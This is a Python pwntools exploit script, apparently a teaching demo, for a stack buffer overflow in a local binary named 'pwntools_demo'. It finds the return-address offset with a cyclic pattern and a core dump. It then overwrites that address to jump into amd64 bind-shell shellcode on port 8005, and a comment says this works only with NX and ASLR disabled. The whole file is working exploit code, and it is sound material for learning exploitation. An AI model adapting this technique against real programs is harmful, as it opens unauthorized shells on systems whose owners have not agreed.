from pwn import *
import struct

# WARNING: this exploit only works with NX and ASLR disabled.

# Set the general context
context.arch = 'amd64'

# Loading the program we will exploit
e = ELF('prueba/pwntools_demo')

# Executing the program once
io = process(e.path)

# Writing a unique pattern of length 1024 to the program's stdin
io.sendline(cyclic(1024))

# Wait for termination, should SIGSEGV
io.wait()

# Get crash information
core = io.corefile

# Return address is stored at the top of the stack (i.e. in $rsp)
stack = core.rsp

# Find what part of our cycle overwrote the return address
pattern = core.read(stack, 4)

# Getting the address of the beginning of the buffer
bufbeg = stack - cyclic(1024).index(pattern)

# Now we want to create a payload so that:
# - at offset 0, we have the shellcode (&bufbeg)
# - at offset cyclic(1024).index(pattern) ($rsp) we write bufbeg
# Then, the program will jump on our shellcode and execute it.
payload = fit({ 0: asm(shellcraft.amd64.linux.bindsh(8005)),
                pattern: struct.pack('L', bufbeg) })

# Now run the program with the payload:
io = process(e.path)

io.sendline(payload)
io.wait()
